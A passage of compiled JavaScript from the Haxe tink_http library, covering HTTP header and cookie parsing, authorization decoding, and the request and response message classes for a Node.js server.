			tink_io_Source.pipeTo(out.body,tink_io_nodejs_NodejsSink.wrap("Outgoing HTTP response to " + req.socket.remoteAddress,res)).handle(function(x) {
				res.end();
			});
		});
	};
};
var tink_http_HandlerObject = function() { };
tink_http_HandlerObject.__name__ = true;
tink_http_HandlerObject.__isInterface__ = true;
tink_http_HandlerObject.prototype = {
	__class__: tink_http_HandlerObject
};
var tink_http_SimpleHandler = function(f) {
	this.f = f;
};
tink_http_SimpleHandler.__name__ = true;
tink_http_SimpleHandler.__interfaces__ = [tink_http_HandlerObject];
tink_http_SimpleHandler.prototype = {
	process: function(req) {
		return this.f(req);
	}
	,__class__: tink_http_SimpleHandler
};
var tink_http_ReadonlyMap = {};
tink_http_ReadonlyMap.get = function(this1,key) {
	return this1.get(key);
};
tink_http_ReadonlyMap.exists = function(this1,key) {
	return this1.exists(key);
};
tink_http_ReadonlyMap.iterator = function(this1) {
	return this1.iterator();
};
tink_http_ReadonlyMap.keys = function(this1) {
	return this1.keys();
};
var tink_http_ContentType = function() {
	this.subtype = "*";
	this.type = "*";
	this.extensions = new haxe_ds_StringMap();
};
tink_http_ContentType.__name__ = true;
tink_http_ContentType.ofString = function(s) {
	var ret = new tink_http_ContentType();
	ret.raw = s;
	var parsed = tink_http_HeaderValue.parse(s);
	var value = parsed[0].value;
	var _g = value.indexOf("/");
	if(_g == -1) {
		ret.type = value;
	} else {
		var pos = _g;
		ret.type = value.substring(0,pos);
		ret.subtype = value.substring(pos + 1);
	}
	ret.extensions = parsed[0].extensions;
	return ret;
};
tink_http_ContentType.prototype = {
	get_fullType: function() {
		return "" + this.type + "/" + this.subtype;
	}
	,toString: function() {
		return this.raw;
	}
	,__class__: tink_http_ContentType
};
var tink_http_Header = function(fields) {
	var tmp;
	if(fields == null) {
		tmp = [];
	} else {
		var v = fields;
		tmp = v;
	}
	this.fields = tmp;
};
tink_http_Header.__name__ = true;
tink_http_Header.prototype = {
	get: function(name) {
		var _g = [];
		var _g1 = 0;
		var _g2 = this.fields;
		while(_g1 < _g2.length) {
			var f = _g2[_g1];
			++_g1;
			if(f.name == name) {
				_g.push(f.value);
			}
		}
		return _g;
	}
	,byName: function(name) {
		var _g = this.get(name);
		switch(_g.length) {
		case 0:
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"No " + name + " header found",{ fileName : "tink/http/Header.hx", lineNumber : 91, className : "tink.http.Header", methodName : "byName"}));
		case 1:
			var v = _g[0];
			return tink_core_Outcome.Success(v);
		default:
			var v = _g;
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"Multiple entries for " + name + " header",{ fileName : "tink/http/Header.hx", lineNumber : 95, className : "tink.http.Header", methodName : "byName"}));
		}
	}
	,contentType: function() {
		return tink_core_OutcomeTools.map(this.byName("content-type"),tink_http_ContentType.ofString);
	}
	,iterator: function() {
		return new haxe_iterators_ArrayIterator(this.fields);
	}
	,concat: function(fields) {
		return new tink_http_Header(this.fields.concat(fields));
	}
	,getContentLength: function() {
		var _g = this.byName("content-length");
		switch(_g._hx_index) {
		case 0:
			var _hx_tmp = Std.parseInt(_g.data);
			if(_hx_tmp == null) {
				return tink_core_Outcome.Failure(new tink_core_TypedError(422,"Invalid Content-Length Header",{ fileName : "tink/http/Header.hx", lineNumber : 120, className : "tink.http.Header", methodName : "getContentLength"}));
			} else {
				var v = _hx_tmp;
				return tink_core_Outcome.Success(v);
			}
			break;
		case 1:
			var e = _g.failure;
			return tink_core_Outcome.Failure(e);
		}
	}
	,accepts: function(type) {
		var prefix = type.split("/")[0];
		return tink_core_OutcomeTools.map(this.byName("accept"),function(v) {
			var _g = 0;
			var _g1 = tink_http_HeaderValue.parse(v);
			while(_g < _g1.length) {
				var entry = _g1[_g];
				++_g;
				if(entry.value == "*/*" || entry.value == type) {
					return true;
				}
				var _g2 = entry.value.split("/");
				if(_g2.length == 2) {
					if(_g2[1] == "*") {
						var p = _g2[0];
						if(prefix == p) {
							return true;
						}
					}
				}
			}
			return false;
		});
	}
	,get_LINEBREAK: function() {
		return "\r\n";
	}
	,toString: function() {
		var _g = [];
		var _g1 = 0;
		var _g2 = this.fields;
		while(_g1 < _g2.length) {
			var f = _g2[_g1];
			++_g1;
			_g.push(f.toString());
		}
		return _g.join("\r\n") + "\r\n" + "\r\n";
	}
	,headerNotFound: function(name) {
		return "No " + name + " header found";
	}
	,__class__: tink_http_Header
};
var tink_http_HeaderValue = {};
tink_http_HeaderValue.getExtension = function(this1) {
	return tink_http_HeaderValue.parse(this1)[0].extensions;
};
tink_http_HeaderValue.parse = function(this1) {
	return tink_http_HeaderValue.parseWith(this1,function(_,params) {
		var _g = new haxe_ds_StringMap();
		var p = params;
		while(p.hasNext()) {
			var p1 = p.next();
			var key = p1.name;
			var value;
			var _g1 = tink_url_Portion.toString(p1.value);
			var quoted = _g1;
			if(HxOverrides.cca(quoted,0) == 34) {
				value = HxOverrides.substr(quoted,1,quoted.length - 2);
			} else {
				var v = _g1;
				value = v;
			}
			_g.h[key] = value;
		}
		return _g;
	});
};
tink_http_HeaderValue.parseWith = function(this1,parseExtension) {
	var _g = [];
	var _g1 = 0;
	var _g2 = this1.split(",");
	while(_g1 < _g2.length) {
		var v = _g2[_g1];
		++_g1;
		v = StringTools.trim(v);
		var i;
		var _g3 = v.indexOf(";");
		if(_g3 == -1) {
			i = v.length;
		} else {
			var i1 = _g3;
			i = i1;
		}
		var value = HxOverrides.substr(v,0,i);
		var sep = ";";
		var pos = i + 1;
		if(pos == null) {
			pos = 0;
		}
		if(sep == null) {
			sep = "&";
		}
		_g.push({ value : value, extensions : parseExtension(value,new tink_url__$Query_QueryStringParser(v,sep,"=",pos))});
	}
	return _g;
};
tink_http_HeaderValue.basicAuth = function(username,password) {
	return "Basic " + haxe_crypto_Base64.encode(haxe_io_Bytes.ofString("" + username + ":" + password)).toString();
};
tink_http_HeaderValue.ofDate = function(d) {
	return DateTools.format(d,tink_http_HeaderValue.DAYS[d.getDay()] + ", %d " + tink_http_HeaderValue.MONTHS[d.getMonth()] + " %Y %H:%M:%S GMT");
};
tink_http_HeaderValue.ofInt = function(i) {
	if(i == null) {
		return "null";
	} else {
		return "" + i;
	}
};
var tink_http_HeaderName = {};
tink_http_HeaderName._new = function(s) {
	var this1 = s;
	return this1;
};
tink_http_HeaderName.ofString = function(s) {
	var this1 = s.toLowerCase();
	return this1;
};
var tink_http_HeaderField = function(name,value) {
	tink_core_NamedWith.call(this,name,value);
};
tink_http_HeaderField.__name__ = true;
tink_http_HeaderField.ofString = function(s) {
	var _g = s.indexOf(":");
	if(_g == -1) {
		var this1 = s.toLowerCase();
		return new tink_http_HeaderField(this1,null);
	} else {
		var v = _g;
		var this1 = HxOverrides.substr(s,0,v).toLowerCase();
		return new tink_http_HeaderField(this1,StringTools.trim(HxOverrides.substr(s,v + 1,null)));
	}
};
tink_http_HeaderField.setCookie = function(key,value,options) {
	if(options == null) {
		options = { };
	}
	var buf_b = "";
	buf_b += Std.string(encodeURIComponent(key) + "=" + encodeURIComponent(value));
	if(options.expires != null) {
		var value = tink_http_HeaderValue.ofDate(options.expires);
		if(value != null) {
			buf_b += "; ";
			buf_b += "expires=";
			buf_b += Std.string(value);
		}
	}
	var value = options.domain;
	if(value != null) {
		buf_b += "; ";
		buf_b += "domain=";
		buf_b += Std.string(value);
	}
	var value = options.path;
	if(value != null) {
		buf_b += "; ";
		buf_b += "path=";
		buf_b += Std.string(value);
	}
	if(options.secure) {
		buf_b += "; ";
		buf_b += "secure";
		buf_b += "";
	}
	if(options.scriptable != true) {
		buf_b += "; ";
		buf_b += "HttpOnly";
		buf_b += "";
	}
	return new tink_http_HeaderField("set-cookie",buf_b);
};
tink_http_HeaderField.__super__ = tink_core_NamedWith;
tink_http_HeaderField.prototype = $extend(tink_core_NamedWith.prototype,{
	toString: function() {
		if(this.value == null) {
			return this.name;
		} else {
			return "" + this.name + ": " + this.value;
		}
	}
	,__class__: tink_http_HeaderField
});
var tink_io_BytewiseParser = function() { };
tink_io_BytewiseParser.__name__ = true;
tink_io_BytewiseParser.__interfaces__ = [tink_io_StreamParserObject];
tink_io_BytewiseParser.prototype = {
	read: function(char) {
		throw haxe_Exception.thrown("abstract");
	}
	,progress: function(cursor) {
		while(true) {
			var _g = this.read(cursor.currentByte);
			switch(_g._hx_index) {
			case 0:
				break;
			case 1:
				var r = _g.r;
				cursor.next();
				return tink_io_ParseStep.Done(r);
			case 2:
				var e = _g.e;
				return tink_io_ParseStep.Failed(e);
			}
			if(!cursor.next()) {
				break;
			}
		}
		return tink_io_ParseStep.Progressed;
	}
	,eof: function(rest) {
		var _g = this.read(-1);
		switch(_g._hx_index) {
		case 0:
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"Unexpected end of input",{ fileName : "tink/io/StreamParser.hx", lineNumber : 180, className : "tink.io.BytewiseParser", methodName : "eof"}));
		case 1:
			var r = _g.r;
			return tink_core_Outcome.Success(r);
		case 2:
			var e = _g.e;
			return tink_core_Outcome.Failure(e);
		}
	}
	,__class__: tink_io_BytewiseParser
};
var tink_io_ParseStep = $hxEnums["tink.io.ParseStep"] = { __ename__:true,__constructs__:null
	,Progressed: {_hx_name:"Progressed",_hx_index:0,__enum__:"tink.io.ParseStep",toString:$estr}
	,Done: ($_=function(r) { return {_hx_index:1,r:r,__enum__:"tink.io.ParseStep",toString:$estr}; },$_._hx_name="Done",$_.__params__ = ["r"],$_)
	,Failed: ($_=function(e) { return {_hx_index:2,e:e,__enum__:"tink.io.ParseStep",toString:$estr}; },$_._hx_name="Failed",$_.__params__ = ["e"],$_)
};
tink_io_ParseStep.__constructs__ = [tink_io_ParseStep.Progressed,tink_io_ParseStep.Done,tink_io_ParseStep.Failed];
var tink_http_HeaderParser = function(makeHeader) {
	this.last = -1;
	this.buf = new StringBuf();
	this.makeHeader = makeHeader;
};
tink_http_HeaderParser.__name__ = true;
tink_http_HeaderParser.__super__ = tink_io_BytewiseParser;
tink_http_HeaderParser.prototype = $extend(tink_io_BytewiseParser.prototype,{
	read: function(c) {
		var _g = this.last;
		switch(c) {
		case -1:
			return this.nextLine();
		case 10:
			if(_g == 13) {
				return this.nextLine();
			} else {
				var other = c;
				this.last = other;
				this.buf.b += String.fromCodePoint(other);
				return tink_io_ParseStep.Progressed;
			}
			break;
		case 13:
			if(_g == 13) {
				var c1 = this.last;
				this.buf.b += String.fromCodePoint(c1);
				return tink_io_ParseStep.Progressed;
			} else {
				this.last = 13;
				return tink_io_ParseStep.Progressed;
			}
			break;
		default:
			if(_g == 13) {
				var other = c;
				var c1 = this.last;
				this.buf.b += String.fromCodePoint(c1);
				this.buf.b += String.fromCodePoint(other);
				this.last = -1;
				return tink_io_ParseStep.Progressed;
			} else {
				var other = c;
				this.last = other;
				this.buf.b += String.fromCodePoint(other);
				return tink_io_ParseStep.Progressed;
			}
		}
	}
	,nextLine: function() {
		var line = this.buf.b;
		this.buf = new StringBuf();
		this.last = -1;
		if(line == "") {
			if(this.header == null) {
				return tink_io_ParseStep.Progressed;
			} else {
				return tink_io_ParseStep.Done(this.header);
			}
		} else if(this.header == null) {
			var _g = this.makeHeader(line,this.fields = []);
			switch(_g._hx_index) {
			case 0:
				var _g1 = _g.data;
				if(_g1 == null) {
					return tink_io_ParseStep.Done(this.header = null);
				} else {
					var v = _g1;
					this.header = v;
					return tink_io_ParseStep.Progressed;
				}
				break;
			case 1:
				var e = _g.failure;
				return tink_io_ParseStep.Failed(e);
			}
		} else {
			this.fields.push(tink_http_HeaderField.ofString(line));
			return tink_io_ParseStep.Progressed;
		}
	}
	,__class__: tink_http_HeaderParser
});
var tink_http_Message = function(header,body) {
	this.header = header;
	this.body = body;
};
tink_http_Message.__name__ = true;
tink_http_Message.prototype = {
	__class__: tink_http_Message
};
var tink_http_Method = {};
tink_http_Method.ofString = function(s,fallback) {
	var _g = s.toUpperCase();
	switch(_g) {
	case "DELETE":
		return "DELETE";
	case "GET":
		return "GET";
	case "HEAD":
		return "HEAD";
	case "OPTIONS":
		return "OPTIONS";
	case "PATCH":
		return "PATCH";
	case "POST":
		return "POST";
	case "PUT":
		return "PUT";
	default:
		var v = _g;
		return fallback(v);
	}
};
var tink_http_RequestHeader = function(method,url,protocol,fields) {
	if(protocol == null) {
		protocol = "HTTP/1.1";
	}
	this.method = method;
	this.url = url;
	this.protocol = protocol;
	tink_http_Header.call(this,fields);
};
tink_http_RequestHeader.__name__ = true;
tink_http_RequestHeader.__super__ = tink_http_Header;
tink_http_RequestHeader.prototype = $extend(tink_http_Header.prototype,{
	concat: function(fields) {
		return new tink_http_RequestHeader(this.method,this.url,this.protocol,this.fields.concat(fields));
	}
	,toString: function() {
		var this1 = this.url;
		return "" + this.method + " " + (this1.query == null ? this1.path : (this1.path == null ? "null" : this1.path) + "?" + (this1.query == null ? "null" : this1.query)) + " " + this.protocol + "\r\n" + tink_http_Header.prototype.toString.call(this);
	}
	,__class__: tink_http_RequestHeader
});
var tink_http_IncomingRequestHeader = function(method,url,protocol,fields) {
	tink_http_RequestHeader.call(this,method,url,protocol,fields);
};
tink_http_IncomingRequestHeader.__name__ = true;
tink_http_IncomingRequestHeader.parser = function() {
	return new tink_http_HeaderParser(function(line,headers) {
		var _g = line.split(" ");
		if(_g.length == 3) {
			var method = _g[0];
			var url = _g[1];
			var protocol = _g[2];
			return tink_core_Outcome.Success(new tink_http_IncomingRequestHeader(method,tink_Url.fromString(url),protocol,headers));
		} else {
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"Invalid HTTP header",{ fileName : "tink/http/Request.hx", lineNumber : 95, className : "tink.http.IncomingRequestHeader", methodName : "parser"}));
		}
	});
};
tink_http_IncomingRequestHeader.fromIncomingMessage = function(req) {
	var req1 = req.method;
	var tmp = tink_Url.fromString(req.url);
	var tmp1 = "HTTP/" + req.httpVersion;
	var _g = [];
	var _g1 = 0;
	var _g2 = req.rawHeaders.length / 2 | 0;
	while(_g1 < _g2) {
		var i = _g1++;
		var this1 = req.rawHeaders[2 * i].toLowerCase();
		_g.push(new tink_http_HeaderField(this1,req.rawHeaders[2 * i + 1]));
	}
	return new tink_http_IncomingRequestHeader(req1,tmp,tmp1,_g);
};
tink_http_IncomingRequestHeader.__super__ = tink_http_RequestHeader;
tink_http_IncomingRequestHeader.prototype = $extend(tink_http_RequestHeader.prototype,{
	getCookies: function() {
		if(this.cookies == null) {
			var _g = new haxe_ds_StringMap();
			var _g1 = 0;
			var this1 = "cookie".toLowerCase();
			var _g2 = this.get(this1);
			while(_g1 < _g2.length) {
				var header = _g2[_g1];
				++_g1;
				var sep = ";";
				if(sep == null) {
					sep = "&";
				}
				var entry = new tink_url__$Query_QueryStringParser(header,sep,"=",0);
				while(entry.hasNext()) {
					var entry1 = entry.next();
					var key = entry1.name;
					var value = tink_url_Portion.toString(entry1.value);
					_g.h[key] = value;
				}
			}
			this.cookies = _g;
		}
		return this.cookies;
	}
	,concat: function(fields) {
		return new tink_http_IncomingRequestHeader(this.method,this.url,this.protocol,this.fields.concat(fields));
	}
	,cookieNames: function() {
		return new haxe_ds__$StringMap_StringMapKeyIterator(this.cookies.h);
	}
	,getCookie: function(name) {
		return this.getCookies().h[name];
	}
	,getAuth: function() {
		return this.getAuthWith(function(s,p) {
			switch(s) {
			case "Basic":
				var decoded;
				try {
					decoded = haxe_crypto_Base64.decode(p).toString();
				} catch( _g ) {
					var e = haxe_Exception.caught(_g).unwrap();
					return tink_core_Outcome.Failure(tink_core_TypedError.withData(null,"Error in decoding basic auth",e,{ fileName : "tink/http/Request.hx", lineNumber : 67, className : "tink.http.IncomingRequestHeader", methodName : "getAuth"}));
				}
				var _g = decoded.indexOf(":");
				if(_g == -1) {
					return tink_core_Outcome.Failure(new tink_core_TypedError(null,"Cannot parse username and password because \":\" is missing",{ fileName : "tink/http/Request.hx", lineNumber : 69, className : "tink.http.IncomingRequestHeader", methodName : "getAuth"}));
				} else {
					var i = _g;
					return tink_core_Outcome.Success(tink_http_Authorization.Basic(HxOverrides.substr(decoded,0,i),HxOverrides.substr(decoded,i + 1,null)));
				}
				break;
			case "Bearer":
				return tink_core_Outcome.Success(tink_http_Authorization.Bearer(p));
			default:
				var s1 = s;
				return tink_core_Outcome.Success(tink_http_Authorization.Others(s1,p));
			}
		});
	}
	,getAuthWith: function(parser) {
		return tink_core_OutcomeTools.flatMap(this.byName("authorization"),tink_core__$Outcome_OutcomeMapper.withSameError(function(v) {
			var _g = v.indexOf(" ");
			if(_g == -1) {
				return tink_core_Outcome.Failure(new tink_core_TypedError(422,"Invalid Authorization Header",{ fileName : "tink/http/Request.hx", lineNumber : 81, className : "tink.http.IncomingRequestHeader", methodName : "getAuthWith"}));
			} else {
				var i = _g;
				return parser(HxOverrides.substr(v,0,i),HxOverrides.substr(v,i + 1,null));
			}
		}));
	}
	,__class__: tink_http_IncomingRequestHeader
});
var tink_http_OutgoingRequestHeader = function(method,url,protocol,fields) {
	if(protocol == null) {
		protocol = "HTTP/1.1";
	}
	var _g = tink_http_OutgoingRequestHeader.extractAuth(url);
	if(_g._hx_index == 0) {
		var v = _g.v;
		url = v.url;
		fields = fields.concat(v.headers);
	}
	tink_http_RequestHeader.call(this,method,url,protocol,fields);
};
tink_http_OutgoingRequestHeader.__name__ = true;
tink_http_OutgoingRequestHeader.extractAuth = function(url) {
	var _g = url.auth;
	if(_g == null) {
		return haxe_ds_Option.None;
	} else {
		var v = _g;
		var tmp = [new tink_http_HeaderField("authorization",tink_http_HeaderValue.basicAuth(v == null ? null : v.split(":")[0],v == null ? null : v.split(":")[1]))];
		var url1 = url.scheme;
		var _g = [];
		var _g1 = 0;
		var _g2 = url.hosts;
		while(_g1 < _g2.length) {
			var host = _g2[_g1];
			++_g1;
			_g.push(host);
		}
		return haxe_ds_Option.Some({ headers : tmp, url : tink_Url.make({ scheme : url1, hosts : _g, path : url.path, query : url.query})});
	}
};
tink_http_OutgoingRequestHeader.__super__ = tink_http_RequestHeader;
tink_http_OutgoingRequestHeader.prototype = $extend(tink_http_RequestHeader.prototype,{
	concat: function(fields) {
		return new tink_http_OutgoingRequestHeader(this.method,this.url,this.protocol,this.fields.concat(fields));
	}
	,__class__: tink_http_OutgoingRequestHeader
});
var tink_http_OutgoingRequest = function(header,body) {
	tink_http_Message.call(this,header,body);
};
tink_http_OutgoingRequest.__name__ = true;
tink_http_OutgoingRequest.__super__ = tink_http_Message;
tink_http_OutgoingRequest.prototype = $extend(tink_http_Message.prototype,{
	__class__: tink_http_OutgoingRequest
});
var tink_http_IncomingRequest = function(clientIp,header,body) {
	this.clientIp = clientIp;
	tink_http_Message.call(this,header,body);
};
tink_http_IncomingRequest.__name__ = true;
tink_http_IncomingRequest.parse = function(clientIp,source) {
	return tink_core_Promise.next(tink_io_RealSourceTools.parse(source,tink_http_IncomingRequestHeader.parser()),function(parts) {
		var clientIp1 = clientIp;
		var parts1 = parts.a;
		var _g = parts.a.getContentLength();
		var d;
		switch(_g._hx_index) {
		case 0:
			var len = _g.data;
			d = tink_io_Source.limit(parts.b,len);
			break;
		case 1:
			var _g1 = _g.failure;
			var _g = parts.a.method;
			var _g1 = parts.a.byName("transfer-encoding");
			switch(_g) {
			case "GET":case "OPTIONS":
				d = tink_io_Source.EMPTY;
				break;
			default:
				if(_g1._hx_index == 0) {
					var _this = _g1.data.split(",");
					var f = StringTools.trim;
					var result = new Array(_this.length);
					var _g = 0;
					var _g1 = _this.length;
					while(_g < _g1) {
						var i = _g++;
						result[i] = f(_this[i]);
					}
					var encodings = result;
					if(encodings.indexOf("chunked") != -1) {
						var source = parts.b;
						d = tink_http_Chunked.decoder().transform(source);
					} else {
						return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(new tink_core_TypedError(411,"Content-Length header missing",{ fileName : "tink/http/Request.hx", lineNumber : 171, className : "tink.http.IncomingRequest", methodName : "parse"}))));
					}
				} else {
					return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(new tink_core_TypedError(411,"Content-Length header missing",{ fileName : "tink/http/Request.hx", lineNumber : 171, className : "tink.http.IncomingRequest", methodName : "parse"}))));
				}
			}
			break;
		}
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(new tink_http_IncomingRequest(clientIp1,parts1,tink_http_IncomingRequestBody.Plain(d)))));
	});
};
tink_http_IncomingRequest.__super__ = tink_http_Message;
tink_http_IncomingRequest.prototype = $extend(tink_http_Message.prototype,{
	__class__: tink_http_IncomingRequest
});
var tink_http_IncomingRequestBody = $hxEnums["tink.http.IncomingRequestBody"] = { __ename__:true,__constructs__:null
	,Plain: ($_=function(source) { return {_hx_index:0,source:source,__enum__:"tink.http.IncomingRequestBody",toString:$estr}; },$_._hx_name="Plain",$_.__params__ = ["source"],$_)
	,Parsed: ($_=function(parts) { return {_hx_index:1,parts:parts,__enum__:"tink.http.IncomingRequestBody",toString:$estr}; },$_._hx_name="Parsed",$_.__params__ = ["parts"],$_)
};
tink_http_IncomingRequestBody.__constructs__ = [tink_http_IncomingRequestBody.Plain,tink_http_IncomingRequestBody.Parsed];
var tink_http_Authorization = $hxEnums["tink.http.Authorization"] = { __ename__:true,__constructs__:null
	,Basic: ($_=function(user,pass) { return {_hx_index:0,user:user,pass:pass,__enum__:"tink.http.Authorization",toString:$estr}; },$_._hx_name="Basic",$_.__params__ = ["user","pass"],$_)
	,Bearer: ($_=function(token) { return {_hx_index:1,token:token,__enum__:"tink.http.Authorization",toString:$estr}; },$_._hx_name="Bearer",$_.__params__ = ["token"],$_)
	,Others: ($_=function(scheme,param) { return {_hx_index:2,scheme:scheme,param:param,__enum__:"tink.http.Authorization",toString:$estr}; },$_._hx_name="Others",$_.__params__ = ["scheme","param"],$_)
};
tink_http_Authorization.__constructs__ = [tink_http_Authorization.Basic,tink_http_Authorization.Bearer,tink_http_Authorization.Others];
var tink_http_ResponseHeader = {};
tink_http_ResponseHeader._new = function(statusCode,reason,fields,protocol) {
	if(protocol == null) {
		protocol = "HTTP/1.1";
	}
	var this1 = new tink_http_ResponseHeaderBase(statusCode,reason,fields,protocol);
	return this1;
};
tink_http_ResponseHeader.fromStatusCode = function(code) {
	var this1 = new tink_http_ResponseHeaderBase(code,null,null,"HTTP/1.1");
	return this1;
};
tink_http_ResponseHeader.fromHeaderFields = function(fields) {
	var this1 = new tink_http_ResponseHeaderBase(200,null,fields,"HTTP/1.1");
	return this1;
};
tink_http_ResponseHeader.parser = function() {
	return tink_http_ResponseHeaderBase.parser();
};
var tink_http_ResponseHeaderBase = function(statusCode,reason,fields,protocol) {
	if(protocol == null) {
		protocol = "HTTP/1.1";
	}
	this.statusCode = statusCode;
	var tmp;
	if(reason == null) {
		var this1 = httpstatus_HttpStatusMessage.fromCode(statusCode);
		tmp = this1;
	} else {
		tmp = reason;
	}
	this.reason = tmp;
	this.protocol = protocol;
	tink_http_Header.call(this,fields);
};
tink_http_ResponseHeaderBase.__name__ = true;
tink_http_ResponseHeaderBase.parser = function() {
	return new tink_http_HeaderParser(function(line,headers) {
		var v = line.split(" ");
		if(v.length >= 3) {
			var statusCode = Std.parseInt(v[1]);
			var reason = v.slice(2).join(" ");
			var protocol = v[0];
			if(protocol == null) {
				protocol = "HTTP/1.1";
			}
			var this1 = new tink_http_ResponseHeaderBase(statusCode,reason,headers,protocol);
			return tink_core_Outcome.Success(this1);
		} else {
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"Invalid HTTP response header",{ fileName : "tink/http/Response.hx", lineNumber : 56, className : "tink.http.ResponseHeaderBase", methodName : "parser"}));
		}
	});
};
tink_http_ResponseHeaderBase.__super__ = tink_http_Header;
tink_http_ResponseHeaderBase.prototype = $extend(tink_http_Header.prototype,{
	concat: function(fields) {
		var statusCode = this.statusCode;
		var reason = this.reason;
		var fields1 = this.fields.concat(fields);
		var protocol = this.protocol;
		if(protocol == null) {
			protocol = "HTTP/1.1";
		}
		var this1 = new tink_http_ResponseHeaderBase(statusCode,reason,fields1,protocol);
		return this1;
	}
	,toString: function() {
		return "" + this.protocol + " " + this.statusCode + " " + this.reason + "\r\n" + tink_http_Header.prototype.toString.call(this);
	}
	,__class__: tink_http_ResponseHeaderBase
});
var tink_http__$Response_OutgoingResponseData = function(header,body) {
	tink_http_Message.call(this,header,body);
};
tink_http__$Response_OutgoingResponseData.__name__ = true;
tink_http__$Response_OutgoingResponseData.__super__ = tink_http_Message;
tink_http__$Response_OutgoingResponseData.prototype = $extend(tink_http_Message.prototype,{
	__class__: tink_http__$Response_OutgoingResponseData
});
var tink_http_OutgoingResponse = {};
tink_http_OutgoingResponse._new = function(header,body) {
	var this1 = new tink_http__$Response_OutgoingResponseData(header,body);
	return this1;
};
tink_http_OutgoingResponse.blob = function(code,chunk,contentType,headers) {
	if(code == null) {
		code = 200;
	}
	var this1 = httpstatus_HttpStatusMessage.fromCode(code);
	var this2 = "Content-Type".toLowerCase();
	var fields = new tink_http_HeaderField(this2,contentType);
	var this2 = "Content-Length".toLowerCase();
	var fields1 = Std.string(chunk.getLength());
	var fields2;
	if(headers == null) {
		fields2 = [];
	} else {
		var v = headers;
		fields2 = v;
	}
	var this3 = new tink_http_ResponseHeaderBase(code,this1,[fields,new tink_http_HeaderField(this2,fields1)].concat(fields2),"HTTP/1.1");
	var this1 = new tink_http__$Response_OutgoingResponseData(this3,new tink_streams_Single(new tink_core__$Lazy_LazyConst(chunk)));
	return this1;
};
tink_http_OutgoingResponse.chunked = function(contentType,headers,source) {
};
tink_http_OutgoingResponse.ofString = function(s) {
	return tink_http_OutgoingResponse.blob(null,tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(s)),"text/plain");
};
tink_http_OutgoingResponse.ofChunk = function(c) {
	return tink_http_OutgoingResponse.blob(null,c,"application/octet-stream");
};
tink_http_OutgoingResponse.reportError = function(e) {
	var code = e.code;
	if(code < 100 || code > 999) {
		code = 500;
	}
	var reason = httpstatus_HttpStatusMessage.fromCode(code);
	var this1 = "Content-Type".toLowerCase();
	var this2 = new tink_http_ResponseHeaderBase(code,reason,[new tink_http_HeaderField(this1,"application/json")],"HTTP/1.1");
	var this1 = new tink_http__$Response_OutgoingResponseData(this2,new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(JSON.stringify({ error : e.message, details : e.data}))))));
	return this1;
};
var tink_http_IncomingResponse = function(header,body) {
	tink_http_Message.call(this,header,body);
};
tink_http_IncomingResponse.__name__ = true;
tink_http_IncomingResponse.readAll = function(res) {
	return tink_core_Promise.next(tink_io_RealSourceTools.all(res.body),function(b) {
		if(res.header.statusCode >= 400) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(tink_core_TypedError.withData(res.header.statusCode,res.header.reason,b.toString(),{ fileName : "tink/http/Response.hx", lineNumber : 115, className : "tink.http.IncomingResponse", methodName : "readAll"}))));
		} else {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(b)));
		}
	});
};
tink_http_IncomingResponse.reportError = function(e) {
	var statusCode = e.code;
	var reason = httpstatus_HttpStatusMessage.fromCode(e.code);
	var this1 = "Content-Type".toLowerCase();
	var this2 = new tink_http_ResponseHeaderBase(statusCode,reason,[new tink_http_HeaderField(this1,"application/json")],"HTTP/1.1");
	return new tink_http_IncomingResponse(this2,new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(JSON.stringify({ error : e.message, details : e.data}))))));
};
tink_http_IncomingResponse.__super__ = tink_http_Message;
tink_http_IncomingResponse.prototype = $extend(tink_http_Message.prototype,{
	__class__: tink_http_IncomingResponse
});
var tink_http_BodyPart = $hxEnums["tink.http.BodyPart"] = { __ename__:true,__constructs__:null
	,Value: ($_=function(v) { return {_hx_index:0,v:v,__enum__:"tink.http.BodyPart",toString:$estr}; },$_._hx_name="Value",$_.__params__ = ["v"],$_)
	,File: ($_=function(handle) { return {_hx_index:1,handle:handle,__enum__:"tink.http.BodyPart",toString:$estr}; },$_._hx_name="File",$_.__params__ = ["handle"],$_)
};
tink_http_BodyPart.__constructs__ = [tink_http_BodyPart.Value,tink_http_BodyPart.File];
var tink_http_UploadedFile = {};
tink_http_UploadedFile.ofBlob = function(name,type,data) {
	return { fileName : name, mimeType : type, size : data.length, read : function() {
		return new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(data)));
	}, saveTo : function(path) {
		var name = "File sink " + path;
		var dest = tink_io_nodejs_NodejsSink.wrap(name,js_node_Fs.createWriteStream(path));
		return tink_core_Future.map(tink_io_Source.pipeTo(new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(data))),dest,{ end : true}),function(r) {
			switch(r._hx_index) {
			case 0:
				return tink_core_Outcome.Success(null);
			case 1:
				var _g = r.result;
				var _g = r.rest;
				return tink_core_Outcome.Failure(new tink_core_TypedError(null,"File $path closed unexpectedly",{ fileName : "tink/http/StructuredBody.hx", lineNumber : 37, className : "tink.http._StructuredBody.UploadedFile_Impl_", methodName : "ofBlob"}));
			case 2:
				var _g = r.rest;
				var e = r.e;
				return tink_core_Outcome.Failure(e);
			}
		});
	}};
};
var tink_http_containers_NodeContainer = function(kind,opt) {
	this.kind = kind;
	this.upgradable = opt != null && opt.upgradable;
};
tink_http_containers_NodeContainer.__name__ = true;
tink_http_containers_NodeContainer.__interfaces__ = [tink_http_Container];
tink_http_containers_NodeContainer.toUpgradeHandler = function(handler) {
	return function(req,socket,head) {
		var handler1 = handler;
		var req1 = req.socket.remoteAddress;
